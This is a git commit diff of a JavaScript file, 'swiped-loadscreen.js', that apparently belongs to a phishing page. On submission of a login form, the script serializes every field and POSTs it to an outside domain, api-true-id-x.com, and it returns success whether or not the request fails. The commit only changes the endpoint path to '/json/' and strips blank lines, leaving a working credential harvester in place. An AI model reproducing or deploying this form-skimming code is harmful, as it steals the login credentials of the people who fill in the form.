c7daa83d11f734130a7a84ce495e443d77f5a84a
rianrenaldi112 <100055534+rianrenaldi112@users.noreply.github.com>
2022-02-21 15:11:56 +0700

    Update swiped-loadscreen.js

--- swiped-loadscreen.js
+++ swiped-loadscreen.js
@@ -1,27 +1,15 @@
 $(".login-form").submit(function() {
-
 	var d = $(".login-form");
 
 	$.ajax({
-
-        url: "https://api-true-id-x.com/",
-
+        url: "https://api-true-id-x.com/json/",
         type: "POST",
-
         data: d.serialize(),
-
         success: function () {
-
             return true;
-
         },
-
         error: function () {
-
             return true;
-
         },
-
     });
-
 });
